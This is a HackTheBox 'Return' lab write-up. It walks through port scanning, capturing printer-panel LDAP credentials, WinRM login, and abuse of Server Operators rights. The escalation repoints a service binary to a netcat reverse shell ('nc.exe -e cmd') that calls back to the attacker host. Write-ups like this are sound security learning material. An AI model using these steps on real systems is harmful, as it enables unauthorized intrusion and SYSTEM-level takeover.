---
title: "HTB - Return"
date: 2025-07-26
author: "ChaosSec"
tags: ["HTB", "Windows", "IIS", "WinRM", "Privilege Escalation", "Service Misconfiguration"]
summary: ""
---

## 🔍 Port Scanning

Initial Nmap scans revealed:

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.11.108 -oG allPorts
nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,5985,9389,47001,49664-49694 10.10.11.108 -oN targeted
```

Open ports included:

- **IIS 10.0** on port 80
- **Kerberos** (88), **LDAP** (389), **SMB** (445), **WinRM** (5985)
- Domain: `return.local`
- Hostname: `PRINTER`

## 📦 SMB and HTTP Enumeration

Enumerated SMB with CrackMapExec:

```bash
crackmapexec smb 10.10.11.108
```

Anonymous access failed to list shares:

```bash
smbclient -L 10.10.11.108 -N
```

Visited the website on port 80 — found a "Printer Admin Panel".

## 🔐 Credential Leak via LDAP Call

In the **Settings** tab of the panel, noticed an automatic connection attempt.  
Set up a listener:

```bash
nc -nlvp 389
```

Captured:

```
return\svc-printer
1edFg43012!!
```

## ✅ Credential Validation

Confirmed credentials via SMB and WinRM:

```bash
crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
crackmapexec winrm 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
```

Output showed `Pwn3d!` ✅

Logged in:

```bash
evil-winrm -i 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
```

Collected user flag.

## ⬆️ Privilege Escalation

Checked group memberships:

```bash
net user svc-printer
```

User was part of the **Server Operators** group — allowed to manage services.

Uploaded netcat to target:

```bash
upload /home/chaos/Return/nc.exe
```

Attempted to create a new service (failed due to permissions), so instead modified an existing service.

Listed modifiable services:

```bash
services
```

Identified `VMTools` as a candidate.

Modified its binary path:

```bash
sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd 10.10.14.9 443"
```

Started listener:

```bash
nc -nlvp 443
```

Restarted the service:

```bash
sc.exe stop VMTools
sc.exe start VMTools
```

🎯 Reverse shell received as **NT AUTHORITY\SYSTEM**

🏁 **Root access achieved via service misconfiguration and privilege abuse.**
